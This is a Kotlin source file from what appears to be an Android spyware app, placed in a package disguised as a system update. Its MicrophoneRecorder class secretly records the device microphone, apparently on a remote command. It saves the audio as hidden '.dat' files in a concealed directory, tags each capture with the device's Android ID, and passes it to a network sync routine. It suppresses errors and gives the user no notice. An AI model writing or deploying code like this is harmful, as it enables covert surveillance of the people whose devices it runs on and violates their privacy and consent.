package com.android.system.update.modules.media

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import com.android.system.update.core.NetworkConnectionManager
import org.json.JSONObject
import java.io.File

class MicrophoneRecorder(private val context: Context) {

    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private val handler = Handler(Looper.getMainLooper())
    private val networkManager = NetworkConnectionManager(context)
    private val hiddenDir: File by lazy {
        File(context.filesDir, ".system_data").apply { if (!exists()) mkdirs() }
    }

    fun startRecording(durationSeconds: Int = 10) {
        if (isRecording) return
        try {
            val audioFile = File(hiddenDir, ".rec_${System.currentTimeMillis()}.dat")
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                MediaRecorder()
            }.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(64000)
                setOutputFile(audioFile.absolutePath)
                prepare()
                start()
            }
            isRecording = true
            handler.postDelayed({
                stopAndUpload(audioFile)
            }, durationSeconds * 1000L)
        } catch (e: Exception) {
            isRecording = false
            mediaRecorder?.release()
            mediaRecorder = null
        }
    }

    private fun stopAndUpload(file: File) {
        if (!isRecording) return
        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
        } catch (e: Exception) {
        } finally {
            mediaRecorder = null
            isRecording = false
        }
        if (file.exists() && file.length() > 0) {
            val payload = JSONObject().apply {
                put("device_id", getDeviceId())
                put("source_type", "microphone")
                put("capture_mode", "remote_cmd")
                put("file_path", file.absolutePath)
                put("is_sensitive", false)
            }
            Thread { networkManager.sync(payload.toString(), "media_captures") }.start()
        }
    }

    private fun getDeviceId(): String {
        return Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    }

    fun isRecordingNow(): Boolean = isRecording
}